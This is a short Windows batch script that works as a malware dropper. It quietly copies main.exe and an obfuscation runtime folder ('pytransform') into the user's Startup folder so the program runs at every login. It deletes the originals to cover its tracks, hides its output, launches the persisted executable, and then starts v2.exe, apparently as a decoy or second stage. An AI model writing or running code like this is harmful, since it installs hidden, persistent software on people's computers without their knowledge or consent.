@echo off
:: here this run codes 

set "SOURCE_DIR=%~dp0"


xcopy "%SOURCE_DIR%main.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /y >nul
xcopy "%SOURCE_DIR%pytransform" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /e /y >nul


del /f /q "%SOURCE_DIR%main.exe"
rmdir /s /q "%SOURCE_DIR%pytransform"


start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\main.exe"

start v2.exe
exit

